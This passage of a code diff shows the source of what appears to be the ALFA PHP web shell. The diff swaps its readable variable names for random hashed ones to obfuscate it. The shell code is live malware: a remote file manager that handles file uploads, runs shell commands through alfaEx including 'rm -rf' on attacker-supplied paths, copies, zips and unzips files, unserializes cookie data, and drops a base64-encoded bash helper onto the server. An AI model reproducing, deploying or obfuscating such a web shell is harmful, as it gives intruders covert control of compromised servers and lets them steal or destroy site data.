+			if(strlen($sfmsaibm8d777f385d3dfec8815d20f7496026dc)>0){
+				return explode("\n", $sfmsaibm8d777f385d3dfec8815d20f7496026dc);
 			}else{
 				return false;
 			}
@@ -2517,44 +2590,44 @@ function _alfa_file($file,$cgi=true){
 			return false;
 		}
 	}else{
-		return $array;
+		return $vmwhayoqf1f713c9e000f5d3f280adbd124df4f5;
 	}
 }
-function _alfa_is_writable($file){
-	$check = false;
-	$check = @is_writable($file);
-	if(!$check){
+function _alfa_is_writable($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac){
+	$kzacvspl0ba4439ee9a46d9d9f14c60f88f45f87 = false;
+	$kzacvspl0ba4439ee9a46d9d9f14c60f88f45f87 = @is_writable($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac);
+	if(!$kzacvspl0ba4439ee9a46d9d9f14c60f88f45f87){
 		if(_alfa_can_runCommand()){
-			$check = alfaEx('[ -w "'.trim(addslashes($file)).'" ] && echo "yes" || echo "no"');
-			if($check == "yes"){
-				$check = true;
+			$kzacvspl0ba4439ee9a46d9d9f14c60f88f45f87 = alfaEx('[ -w "'.trim(addslashes($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac)).'" ] && echo "yes" || echo "no"');
+			if($kzacvspl0ba4439ee9a46d9d9f14c60f88f45f87 == "yes"){
+				$kzacvspl0ba4439ee9a46d9d9f14c60f88f45f87 = true;
 			}else{
-				$check = false;
+				$kzacvspl0ba4439ee9a46d9d9f14c60f88f45f87 = false;
 			}
 		}
 	}
-	return $check;
+	return $kzacvspl0ba4439ee9a46d9d9f14c60f88f45f87;
 }
-function _alfa_is_dir($dir,$mode="-d"){
-	$check = false;
-	$check = @is_dir($dir);
-	if($mode == "-e"){
-		$check = @is_file($dir);
+function _alfa_is_dir($ofvepnxk736007832d2167baaae763fd3a3f3cf1,$porcbkyw15d61712450a686a7f365adf4fef581f="-d"){
+	$kzacvspl0ba4439ee9a46d9d9f14c60f88f45f87 = false;
+	$kzacvspl0ba4439ee9a46d9d9f14c60f88f45f87 = @is_dir($ofvepnxk736007832d2167baaae763fd3a3f3cf1);
+	if($porcbkyw15d61712450a686a7f365adf4fef581f == "-e"){
+		$kzacvspl0ba4439ee9a46d9d9f14c60f88f45f87 = @is_file($ofvepnxk736007832d2167baaae763fd3a3f3cf1);
 	}
-	if(!$check){
+	if(!$kzacvspl0ba4439ee9a46d9d9f14c60f88f45f87){
 		if(_alfa_can_runCommand()){
-			$check = alfaEx('[ "'.trim($mode).'" "'.trim(addslashes($dir)).'" ] && echo "yes" || echo "no"');
-			if($check == "yes"){
+			$kzacvspl0ba4439ee9a46d9d9f14c60f88f45f87 = alfaEx('[ "'.trim($porcbkyw15d61712450a686a7f365adf4fef581f).'" "'.trim(addslashes($ofvepnxk736007832d2167baaae763fd3a3f3cf1)).'" ] && echo "yes" || echo "no"');
+			if($kzacvspl0ba4439ee9a46d9d9f14c60f88f45f87 == "yes"){
 				return true;
 			}else{
 				return false;
 			}
 		}
 	}
-	return $check;
+	return $kzacvspl0ba4439ee9a46d9d9f14c60f88f45f87;
 }
-function _alfa_load_ace_options($base){
-	return '<span>Theme: </span><select class="ace-controler ace-theme-selector" base="'.$base.'" onChange="alfaAceChangeSetting(this,\'theme\');"><option value="terminal" selected>terminal</option><option value="ambiance">ambiance</option><option value="chaos">chaos</option><option value="chrome">chrome</option><option value="clouds">clouds</option><option value="clouds_midnight">clouds_midnight</option><option value="cobalt">cobalt</option><option value="crimson_editor">crimson_editor</option><option value="dawn">dawn</option><option value="dracula">dracula</option><option value="dreamweaver">dreamweaver</option><option value="eclipse">eclipse</option><option value="github">github</option><option value="gob">gob</option><option value="gruvbox">gruvbox</option><option value="idle_fingers">idle_fingers</option><option value="iplastic">iplastic</option><option value="katzenmilch">katzenmilch</option><option value="kr_theme">kr_theme</option><option value="kuroir">kuroir</option><option value="merbivore">merbivore</option><option value="merbivore_soft">merbivore_soft</option><option value="mono_industrial">mono_industrial</option><option value="monokai">monokai</option><option value="nord_dark">nord_dark</option><option value="pastel_on_dark">pastel_on_dark</option><option value="solarized_dark">solarized_dark</option><option value="solarized_light">solarized_light</option><option value="sqlserver">sqlserver</option><option value="textmate">textmate</option><option value="tomorrow">tomorrow</option><option value="tomorrow_night">tomorrow_night</option><option value="tomorrow_night_blue">tomorrow_night_blue</option><option value="tomorrow_night_bright">tomorrow_night_bright</option><option value="tomorrow_night_eighties">tomorrow_night_eighties</option><option value="twilight">twilight</option><option value="vibrant_ink">vibrant_ink</option><option value="xcode">xcode</option></select><span>Language: </span><select class="ace-controler" base="'.$base.'" onChange="alfaAceChangeSetting(this,\'lang\');"><option value="php">php</option><option value="python">python</option><option value="perl">perl</option><option value="c_cpp">c/c++</option><option value="csharp">c#</option><option value="ruby">ruby</option><option value="html">html</option><option value="javascript">javascript</option><option value="css">css</option><option value="xml">xml</option><option value="sql">sql</option><option value="swift">swift</option><option value="sh">bash</option><option value="lua">lua</option><option value="powershell">powershell</option><option value="jsp">jsp</option><option value="java">java</option><option value="json">json</option><option value="plain_text">plain_text</option></select><span>Soft Wrap: </span><input type="checkbox" name="wrapmode" class="ace-controler" onClick="alfaAceChangeWrapMode(this,\''.$base.'\');" checked> | <span>Font Size: </span><button class="ace-controler" style="cursor:pointer;" onclick="alfaAceChangeFontSize(\''.$base.'\',\'+\', this);return false;">+</button> | <button style="cursor:pointer;" class="ace-controler" onclick="alfaAceChangeFontSize(\''.$base.'\', \'-\', this);return false;">-</button> | ';
+function _alfa_load_ace_options($smfdutmo593616de15330c0fb2d55e55410bf994){
+	return '<span>Theme: </span><select class="ace-controler ace-theme-selector" base="'.$smfdutmo593616de15330c0fb2d55e55410bf994.'" onChange="alfaAceChangeSetting(this,\'theme\');"><option value="terminal" selected>terminal</option><option value="ambiance">ambiance</option><option value="chaos">chaos</option><option value="chrome">chrome</option><option value="clouds">clouds</option><option value="clouds_midnight">clouds_midnight</option><option value="cobalt">cobalt</option><option value="crimson_editor">crimson_editor</option><option value="dawn">dawn</option><option value="dracula">dracula</option><option value="dreamweaver">dreamweaver</option><option value="eclipse">eclipse</option><option value="github">github</option><option value="gob">gob</option><option value="gruvbox">gruvbox</option><option value="idle_fingers">idle_fingers</option><option value="iplastic">iplastic</option><option value="katzenmilch">katzenmilch</option><option value="kr_theme">kr_theme</option><option value="kuroir">kuroir</option><option value="merbivore">merbivore</option><option value="merbivore_soft">merbivore_soft</option><option value="mono_industrial">mono_industrial</option><option value="monokai">monokai</option><option value="nord_dark">nord_dark</option><option value="pastel_on_dark">pastel_on_dark</option><option value="solarized_dark">solarized_dark</option><option value="solarized_light">solarized_light</option><option value="sqlserver">sqlserver</option><option value="textmate">textmate</option><option value="tomorrow">tomorrow</option><option value="tomorrow_night">tomorrow_night</option><option value="tomorrow_night_blue">tomorrow_night_blue</option><option value="tomorrow_night_bright">tomorrow_night_bright</option><option value="tomorrow_night_eighties">tomorrow_night_eighties</option><option value="twilight">twilight</option><option value="vibrant_ink">vibrant_ink</option><option value="xcode">xcode</option></select><span>Language: </span><select class="ace-controler" base="'.$smfdutmo593616de15330c0fb2d55e55410bf994.'" onChange="alfaAceChangeSetting(this,\'lang\');"><option value="php">php</option><option value="python">python</option><option value="perl">perl</option><option value="c_cpp">c/c++</option><option value="csharp">c#</option><option value="ruby">ruby</option><option value="html">html</option><option value="javascript">javascript</option><option value="css">css</option><option value="xml">xml</option><option value="sql">sql</option><option value="swift">swift</option><option value="sh">bash</option><option value="lua">lua</option><option value="powershell">powershell</option><option value="jsp">jsp</option><option value="java">java</option><option value="json">json</option><option value="plain_text">plain_text</option></select><span>Soft Wrap: </span><input type="checkbox" name="wrapmode" class="ace-controler" onClick="alfaAceChangeWrapMode(this,\''.$smfdutmo593616de15330c0fb2d55e55410bf994.'\');" checked> | <span>Font Size: </span><button class="ace-controler" style="cursor:pointer;" onclick="alfaAceChangeFontSize(\''.$smfdutmo593616de15330c0fb2d55e55410bf994.'\',\'+\', this);return false;">+</button> | <button style="cursor:pointer;" class="ace-controler" onclick="alfaAceChangeFontSize(\''.$smfdutmo593616de15330c0fb2d55e55410bf994.'\', \'-\', this);return false;">-</button> | ';
 }
 function alfaFilesMan2(){
 	alfahead();
@@ -2562,15 +2635,15 @@ function alfaFilesMan2(){
 	echo '<div style="position:relative;" fm_id="1" id="filesman_holder_1" class="ajaxarea filesman-active-content"><div class="header"></div></div>';
 	alfaFooter();
 }
-function copy_paste($c,$s,$d){
-if(@is_dir($c.$s)){
-@mkdir($d.$s);
-$h = @opendir($c.$s);
-while (($f = @readdir($h)) !== false)
-if (($f != ".") and ($f != ".."))
-copy_paste($c.$s.'/',$f, $d.$s.'/');
-} elseif(is_file($c.$s))
-@copy($c.$s, $d.$s);
+function copy_paste($yyphbkaj4a8a08f09d37b73795649038408b5f33,$fwekvgvg03c7c0ace395d80182db07ae2c30f034,$iwxbtdws8277e0910d750195b448797616e091ad){
+if(@is_dir($yyphbkaj4a8a08f09d37b73795649038408b5f33.$fwekvgvg03c7c0ace395d80182db07ae2c30f034)){
+@mkdir($iwxbtdws8277e0910d750195b448797616e091ad.$fwekvgvg03c7c0ace395d80182db07ae2c30f034);
+$cvnwfemf2510c39011c5be704182423e3a695e91 = @opendir($yyphbkaj4a8a08f09d37b73795649038408b5f33.$fwekvgvg03c7c0ace395d80182db07ae2c30f034);
+while (($npviloqa8fa14cdd754f91cc6554c9e71929cce7 = @readdir($cvnwfemf2510c39011c5be704182423e3a695e91)) !== false)
+if (($npviloqa8fa14cdd754f91cc6554c9e71929cce7 != ".") and ($npviloqa8fa14cdd754f91cc6554c9e71929cce7 != ".."))
+copy_paste($yyphbkaj4a8a08f09d37b73795649038408b5f33.$fwekvgvg03c7c0ace395d80182db07ae2c30f034.'/',$npviloqa8fa14cdd754f91cc6554c9e71929cce7, $iwxbtdws8277e0910d750195b448797616e091ad.$fwekvgvg03c7c0ace395d80182db07ae2c30f034.'/');
+} elseif(is_file($yyphbkaj4a8a08f09d37b73795649038408b5f33.$fwekvgvg03c7c0ace395d80182db07ae2c30f034))
+@copy($yyphbkaj4a8a08f09d37b73795649038408b5f33.$fwekvgvg03c7c0ace395d80182db07ae2c30f034, $iwxbtdws8277e0910d750195b448797616e091ad.$fwekvgvg03c7c0ace395d80182db07ae2c30f034);
 }
 function alfaFilesMan(){
 if(!empty ($_COOKIE['alfa_f']))
@@ -2578,44 +2651,44 @@ $_COOKIE['alfa_f'] = @unserialize($_COOKIE['alfa_f']);
 if(!empty($_POST['alfa1'])){
 switch($_POST['alfa1']){
 case 'uploadFile':
-$move_cmd_file = false;
-$alfa_canruncmd = false;
+$doruqucfc493d5843b2f13d20361344a206ab0bd = false;
+$mzmqxzhpe782b1ecc296da557fbe5edc82e64dd7 = false;
 if($GLOBALS['glob_chdir_false']){
-	$alfa_canruncmd = _alfa_can_runCommand(true,true);
-	$move_cmd_file = true;
+	$mzmqxzhpe782b1ecc296da557fbe5edc82e64dd7 = _alfa_can_runCommand(true,true);
+	$doruqucfc493d5843b2f13d20361344a206ab0bd = true;
 }
 if(_alfa_is_writable($GLOBALS['cwd'])){
-$files = reArrayFiles($_FILES['f']);
-$ret_files = array();
-foreach($files as $file){
-if($move_cmd_file&&$alfa_canruncmd){
-	alfaEx("cat '".addslashes($file['tmp_name'])."' > '".addslashes($_POST["c"]."/".$file['name'])."'");
+$blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1 = reArrayFiles($_FILES['f']);
+$haezbfwi192876560906d9f9c77d35838bb306ba = array();
+foreach($blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1 as $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac){
+if($doruqucfc493d5843b2f13d20361344a206ab0bd&&$mzmqxzhpe782b1ecc296da557fbe5edc82e64dd7){
+	alfaEx("cat '".addslashes($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac['tmp_name'])."' > '".addslashes($_POST["c"]."/".$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac['name'])."'");
 }else{
-	if(@move_uploaded_file($file['tmp_name'],$file['name'])){
-		$ow = function_exists("posix_getpwuid")&&function_exists("fileowner")?@posix_getpwuid(@fileowner($file['name'])):array("name" => "????");
-		$gr = function_exists("posix_getgrgid")&&function_exists("filegroup")?@posix_getgrgid(@filegroup($file['name'])):array("name" => "????");
-		$file_owner = $ow['name']?$ow['name']:(function_exists("fileowner")?@fileowner($file['name']):"????");
-		$file_group = $gr['name']?$gr['name']:(function_exists("filegroup")?@filegroup($file['name']):"????");
-		$file_modify = @date('Y-m-d H:i:s', @filemtime($file['name']));
-		$file_perm = alfaPermsColor($file['name']);
-		$file_size = @filesize($file['name']);
-		$ret_files[] = array("name" => $file['name'], "size" => alfaSize($file_size), "perm" => $file_perm, "modify" => $file_modify, "owner" => $file_owner."/".$file_group);
+	if(@move_uploaded_file($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac['tmp_name'],$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac['name'])){
+		$eajtptdv617a4046ef07a0d9851942247a994cf9 = function_exists("posix_getpwuid")&&function_exists("fileowner")?@posix_getpwuid(@fileowner($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac['name'])):array("name" => "????");
+		$ylzdpqhrd692bc40d83423d24d3a37582f58468c = function_exists("posix_getgrgid")&&function_exists("filegroup")?@posix_getgrgid(@filegroup($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac['name'])):array("name" => "????");
+		$dkaogabh4ec4bcc7102266cf3de98ec5693b356a = $eajtptdv617a4046ef07a0d9851942247a994cf9['name']?$eajtptdv617a4046ef07a0d9851942247a994cf9['name']:(function_exists("fileowner")?@fileowner($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac['name']):"????");
+		$rpagoyoaffa309cd16f9906446e409e8e1fca46c = $ylzdpqhrd692bc40d83423d24d3a37582f58468c['name']?$ylzdpqhrd692bc40d83423d24d3a37582f58468c['name']:(function_exists("filegroup")?@filegroup($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac['name']):"????");
+		$kaetjeum0accdd691149b8182212528c8ed7330c = @date('Y-m-d H:i:s', @filemtime($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac['name']));
+		$jldneloy4ac335b84cbc6e1bce3868e38065f567 = alfaPermsColor($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac['name']);
+		$noybsmul234ef73792399c22704f8aef10b14541 = @filesize($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac['name']);
+		$haezbfwi192876560906d9f9c77d35838bb306ba[] = array("name" => $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac['name'], "size" => alfaSize($noybsmul234ef73792399c22704f8aef10b14541), "perm" => $jldneloy4ac335b84cbc6e1bce3868e38065f567, "modify" => $kaetjeum0accdd691149b8182212528c8ed7330c, "owner" => $dkaogabh4ec4bcc7102266cf3de98ec5693b356a."/".$rpagoyoaffa309cd16f9906446e409e8e1fca46c);
 	}
 }
 }
-if(!$move_cmd_file){
-	echo json_encode($ret_files);
+if(!$doruqucfc493d5843b2f13d20361344a206ab0bd){
+	echo json_encode($haezbfwi192876560906d9f9c77d35838bb306ba);
 }
 }else{
 	echo "noperm";
 	return;
 }
-if(!$move_cmd_file){
+if(!$doruqucfc493d5843b2f13d20361344a206ab0bd){
 return;
 }
 break;
 case 'mkdir':
-$new_dir_cmd = false;
+$ypqojtbob5fafbfc3d2662e3532f51a4d115cbcf = false;
 if($GLOBALS['glob_chdir_false']){
 	if(_alfa_can_runCommand(true,true)){
 		if(_alfa_is_writable($GLOBALS['cwd'])){
@@ -2647,37 +2720,37 @@ if($GLOBALS['glob_chdir_false']){
 }
 break;
 case 'delete':
-function deleteDir($path){
-$path = (substr($path,-1)=='/') ? $path:$path.'/';
-$dh = @opendir($path);
-while(($item = @readdir($dh)) !== false){
-$item = $path.$item;
-if((basename($item) == "..") || (basename($item) == "."))
+function deleteDir($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485){
+$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485 = (substr($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485,-1)=='/') ? $jwzcflrpd6fe1d0be6347b8ef2427fa629c04485:$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485.'/';
+$qwysgjpm700f6fa0edb608ee5cc3cfa63f1c94cc = @opendir($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485);
+while(($geklwdir447b7147e84be512208dcc0995d67ebc = @readdir($qwysgjpm700f6fa0edb608ee5cc3cfa63f1c94cc)) !== false){
+$geklwdir447b7147e84be512208dcc0995d67ebc = $jwzcflrpd6fe1d0be6347b8ef2427fa629c04485.$geklwdir447b7147e84be512208dcc0995d67ebc;
+if((basename($geklwdir447b7147e84be512208dcc0995d67ebc) == "..") || (basename($geklwdir447b7147e84be512208dcc0995d67ebc) == "."))
 continue;
-$type = @filetype($item);
-if ($type == "dir")
-deleteDir($item);
+$hcgexxko599dcce2998a6b40b1e38e8c6006cb0a = @filetype($geklwdir447b7147e84be512208dcc0995d67ebc);
+if ($hcgexxko599dcce2998a6b40b1e38e8c6006cb0a == "dir")
+deleteDir($geklwdir447b7147e84be512208dcc0995d67ebc);
 else
-@unlink($item);
+@unlink($geklwdir447b7147e84be512208dcc0995d67ebc);
 }
-@closedir($dh);
-@rmdir($path);
+@closedir($qwysgjpm700f6fa0edb608ee5cc3cfa63f1c94cc);
+@rmdir($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485);
 }
 if(is_array(@$_POST['f']))
-foreach($_POST['f'] as $f){
-if($f == '..')
+foreach($_POST['f'] as $npviloqa8fa14cdd754f91cc6554c9e71929cce7){
+if($npviloqa8fa14cdd754f91cc6554c9e71929cce7 == '..')
 continue;
-$f = rawurldecode($f);
+$npviloqa8fa14cdd754f91cc6554c9e71929cce7 = rawurldecode($npviloqa8fa14cdd754f91cc6554c9e71929cce7);
 if($GLOBALS["glob_chdir_false"]){
 	if(_alfa_can_runCommand(true,true)){
-		alfaEx("rm -rf '".addslashes($_POST['c'].'/'.$f)."'");
+		alfaEx("rm -rf '".addslashes($_POST['c'].'/'.$npviloqa8fa14cdd754f91cc6554c9e71929cce7)."'");
 	}
 }else{
-alfaEx("rm -rf '".addslashes($f)."'",false,false);
-if(@is_dir($f))
-deleteDir($f);
+alfaEx("rm -rf '".addslashes($npviloqa8fa14cdd754f91cc6554c9e71929cce7)."'",false,false);
+if(@is_dir($npviloqa8fa14cdd754f91cc6554c9e71929cce7))
+deleteDir($npviloqa8fa14cdd754f91cc6554c9e71929cce7);
 else
-@unlink($f);
+@unlink($npviloqa8fa14cdd754f91cc6554c9e71929cce7);
 }
 }
 if(@is_dir(rawurldecode(@$_POST['alfa2']))&&rawurldecode(@$_POST['alfa2'])!='..'){
@@ -2687,10 +2760,10 @@ alfaEx("rm -rf '".addslashes($_POST['alfa2'])."'",false,false);
 @unlink(rawurldecode(@$_POST['alfa2']));
 }
 if($GLOBALS["glob_chdir_false"]){
-	$source = rawurldecode(@$_POST['alfa2']);
-	if($source!='..'&&!empty($source)){
+	$kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb = rawurldecode(@$_POST['alfa2']);
+	if($kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb!='..'&&!empty($kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb)){
 		if(_alfa_can_runCommand(true,true)){
-			alfaEx("cd '".trim(addslashes($_POST['c']))."';rm -rf '".addslashes($source)."'");
+			alfaEx("cd '".trim(addslashes($_POST['c']))."';rm -rf '".addslashes($kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb)."'");
 		}
 	}
 }
@@ -2699,48 +2772,48 @@ return;
 break;
 case 'paste':
 if($_COOKIE['alfa_act'] == 'copy'&&isset($_COOKIE['alfa_f'])){
-foreach($_COOKIE['alfa_f'] as $f)
-copy_paste($_COOKIE['alfa_c'],$f, $GLOBALS['cwd']);
+foreach($_COOKIE['alfa_f'] as $npviloqa8fa14cdd754f91cc6554c9e71929cce7)
+copy_paste($_COOKIE['alfa_c'],$npviloqa8fa14cdd754f91cc6554c9e71929cce7, $GLOBALS['cwd']);
 }elseif($_COOKIE['alfa_act'] == 'move'&&isset($_COOKIE['alfa_f'])){
-function move_paste($c,$s,$d){
-if(@is_dir($c.$s)){
-@mkdir($d.$s);
-$h = @opendir($c.$s);
-while (($f = @readdir($h)) !== false)
-if(($f != ".") and ($f != ".."))
-copy_paste($c.$s.'/',$f, $d.$s.'/');
-}elseif(@is_file($c.$s))
-@copy($c.$s, $d.$s);
+function move_paste($yyphbkaj4a8a08f09d37b73795649038408b5f33,$fwekvgvg03c7c0ace395d80182db07ae2c30f034,$iwxbtdws8277e0910d750195b448797616e091ad){
+if(@is_dir($yyphbkaj4a8a08f09d37b73795649038408b5f33.$fwekvgvg03c7c0ace395d80182db07ae2c30f034)){
+@mkdir($iwxbtdws8277e0910d750195b448797616e091ad.$fwekvgvg03c7c0ace395d80182db07ae2c30f034);
+$cvnwfemf2510c39011c5be704182423e3a695e91 = @opendir($yyphbkaj4a8a08f09d37b73795649038408b5f33.$fwekvgvg03c7c0ace395d80182db07ae2c30f034);
+while (($npviloqa8fa14cdd754f91cc6554c9e71929cce7 = @readdir($cvnwfemf2510c39011c5be704182423e3a695e91)) !== false)
+if(($npviloqa8fa14cdd754f91cc6554c9e71929cce7 != ".") and ($npviloqa8fa14cdd754f91cc6554c9e71929cce7 != ".."))
+copy_paste($yyphbkaj4a8a08f09d37b73795649038408b5f33.$fwekvgvg03c7c0ace395d80182db07ae2c30f034.'/',$npviloqa8fa14cdd754f91cc6554c9e71929cce7, $iwxbtdws8277e0910d750195b448797616e091ad.$fwekvgvg03c7c0ace395d80182db07ae2c30f034.'/');
+}elseif(@is_file($yyphbkaj4a8a08f09d37b73795649038408b5f33.$fwekvgvg03c7c0ace395d80182db07ae2c30f034))
+@copy($yyphbkaj4a8a08f09d37b73795649038408b5f33.$fwekvgvg03c7c0ace395d80182db07ae2c30f034, $iwxbtdws8277e0910d750195b448797616e091ad.$fwekvgvg03c7c0ace395d80182db07ae2c30f034);
 }
-foreach($_COOKIE['alfa_f'] as $f)
-@rename($_COOKIE['alfa_c'].$f, $GLOBALS['cwd'].$f);
+foreach($_COOKIE['alfa_f'] as $npviloqa8fa14cdd754f91cc6554c9e71929cce7)
+@rename($_COOKIE['alfa_c'].$npviloqa8fa14cdd754f91cc6554c9e71929cce7, $GLOBALS['cwd'].$npviloqa8fa14cdd754f91cc6554c9e71929cce7);
 }elseif($_COOKIE['alfa_act'] == 'zip'&&isset($_COOKIE['alfa_f'])){
 if(class_exists('ZipArchive')){
-$zip = new ZipArchive();
-$zipX = "alfa_".rand(1,1000).".zip";
-if($zip->open($zipX, 1)){
+$zessjrwjadcdbd79a8d84175c229b192aadc02f2 = new ZipArchive();
+$trmxvosf5edbecc938805e5bd1ec6d39e3733bd5 = "alfa_".rand(1,1000).".zip";
+if($zessjrwjadcdbd79a8d84175c229b192aadc02f2->open($trmxvosf5edbecc938805e5bd1ec6d39e3733bd5, 1)){
 @chdir($_COOKIE['alfa_c']);
-foreach($_COOKIE['alfa_f'] as $f){
-if($f == '..')continue;
-if(@is_file($_COOKIE['alfa_c'].$f))
-$zip->addFile($_COOKIE['alfa_c'].$f, $f);
-elseif(@is_dir($_COOKIE['alfa_c'].$f)){
-$iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($f.'/'));
-foreach($iterator as $key=>$value){
-$key = str_replace('\\','/',realpath($key));
-if(@is_dir($key)){
-if(in_array(substr($key, strrpos($key,'/')+1),array('.', '..')))continue;
-}else{$zip->addFile($key,$key);}}}}
+foreach($_COOKIE['alfa_f'] as $npviloqa8fa14cdd754f91cc6554c9e71929cce7){
+if($npviloqa8fa14cdd754f91cc6554c9e71929cce7 == '..')continue;
+if(@is_file($_COOKIE['alfa_c'].$npviloqa8fa14cdd754f91cc6554c9e71929cce7))
+$zessjrwjadcdbd79a8d84175c229b192aadc02f2->addFile($_COOKIE['alfa_c'].$npviloqa8fa14cdd754f91cc6554c9e71929cce7, $npviloqa8fa14cdd754f91cc6554c9e71929cce7);
+elseif(@is_dir($_COOKIE['alfa_c'].$npviloqa8fa14cdd754f91cc6554c9e71929cce7)){
+$zeqhfpyq420cec00303cf5ff3ee30bf824fc1427 = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($npviloqa8fa14cdd754f91cc6554c9e71929cce7.'/'));
+foreach($zeqhfpyq420cec00303cf5ff3ee30bf824fc1427 as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d=>$rkptsoeg2063c1608d6e0baf80249c42e2be5804){
+$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d = str_replace('\\','/',realpath($ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d));
+if(@is_dir($ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d)){
+if(in_array(substr($ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d, strrpos($ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d,'/')+1),array('.', '..')))continue;
+}else{$zessjrwjadcdbd79a8d84175c229b192aadc02f2->addFile($ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d,$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d);}}}}
 @chdir($GLOBALS['cwd']);
-$zip->close();
-__alert('>> '.$zipX.' << is created...');}}
+$zessjrwjadcdbd79a8d84175c229b192aadc02f2->close();
+__alert('>> '.$trmxvosf5edbecc938805e5bd1ec6d39e3733bd5.' << is created...');}}
 }elseif($_COOKIE['alfa_act'] == 'unzip'&&isset($_COOKIE['alfa_f'])){
 if(class_exists('ZipArchive')){
-$zip = new ZipArchive();
-foreach($_COOKIE['alfa_f'] as $f) {
-if($zip->open($_COOKIE['alfa_c'].$f)){
-$zip->extractTo($_COOKIE['alfa_cwd']);
-$zip->close();}}}}
+$zessjrwjadcdbd79a8d84175c229b192aadc02f2 = new ZipArchive();
+foreach($_COOKIE['alfa_f'] as $npviloqa8fa14cdd754f91cc6554c9e71929cce7) {
+if($zessjrwjadcdbd79a8d84175c229b192aadc02f2->open($_COOKIE['alfa_c'].$npviloqa8fa14cdd754f91cc6554c9e71929cce7)){
+$zessjrwjadcdbd79a8d84175c229b192aadc02f2->extractTo($_COOKIE['alfa_cwd']);
+$zessjrwjadcdbd79a8d84175c229b192aadc02f2->close();}}}}
 unset($_COOKIE['alfa_f']);
 break;
 default:
@@ -2755,172 +2828,172 @@ return;
 break;
 }
 }
-$dirContent = @scandir(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd']);
-if(preg_match("#(.*)\/\.\.#", $_POST['c'], $res)){
-	$path = explode('/', $res[1]);
-	array_pop($path);
-	$_POST['c'] = implode('/', $path);
+$ynxombge846b365452129ca6fc37251d7cc56b2d = @scandir(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd']);
+if(preg_match("#(.*)\/\.\.#", $_POST['c'], $ybaqpbzt9b207167e5381c47682c6b4f58a623fb)){
+	$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485 = explode('/', $ybaqpbzt9b207167e5381c47682c6b4f58a623fb[1]);
+	array_pop($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485);
+	$_POST['c'] = implode('/', $jwzcflrpd6fe1d0be6347b8ef2427fa629c04485);
 }
-$cmd_dir = false;
-if($dirContent === false){
+$dninrxalb3c2a4e4e995e2bb566ea05a15ae7efb = false;
+if($ynxombge846b365452129ca6fc37251d7cc56b2d === false){
 	if(_alfa_can_runCommand(true,true)){
-		$tmp_getdir_path = @$_COOKIE["alfachdir_bash_path"];
+		$haiclsffee9a367452a770ec5b0860f6a0e4ebe6 = @$_COOKIE["alfachdir_bash_path"];
 		@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
-		if(!isset($_COOKIE["alfachdir_bash"])||@!file_exists($tmp_getdir_path."/alfacgiapi/getdir.alfa")){
-			$bash = "jZTfb5swEMef4a+4uaYkSmmS/YpEwsOkqVNfO+1hSqKKggnWwI4MEaFppL3vv9xfUtsYSKpMWh6I7/O9O9vcHVfvxrtCjJ8oGxep/fX+IcBT+/7ue4DdFXNtEqUc0BLZCRdAgTLAg6wALwQsfYdziLkN8rcNyzRAio0xRRrRBJZLwBSCANDtLYLra/D2Mr5KaZSCIGGcUfZrCOv1HMqUMB3VJcOD1gO8BLBiw86DBhpoO6G2RVnCZURRhiV4ESDnznd++M433yl856c/cULf+YLaLJa6n+u7+gzgCXWdUIiwhsViAQirbMi2ynpLAnzQynKyPurdeMWI6OjU0I3gu21H30tqFfS5j/6gSM5jmtQd+2hit0TkbJd3/NMJT3d5yDrls1EYqR571XWb1yALNBgApcFkLp8LfLjqfI6KjEYw7Av2JstIFu/QWT6m1J8e//7+05Qy5oy8PdNZuKxAU21zGV3zyXQ2m6G+vJbVXhVNlGJAkw/FQm5X7eVDVPKxF5V00LXVmb1KFkaVTyVUraSYOGFnm0Q84yJAeUjZ40YQwvRRZUKSmXT/FSo7tSR9aEEu+AgStx79abHqHf0SYipIVHJRn22kW0tpJ0fqYwTZ7LJQyM7OiL7uy8tlB5Jvy/rfbkWdP/GMRqCm6ML+OrA5tp7zwwqxMCcr5MNKTsEK3ch/5WpIs1RQT4GhZq2wHgODzVphNQqGNksFm2kwuDWUYJrEKJ3VSrpdTkRjt7IuzYls7OONrZu4+Z4djmv0Cg==";
-			$tmp_getdir_path = alfaWriteTocgiapi("getdir.alfa",$bash);
+		if(!isset($_COOKIE["alfachdir_bash"])||@!file_exists($haiclsffee9a367452a770ec5b0860f6a0e4ebe6."/alfacgiapi/getdir.alfa")){
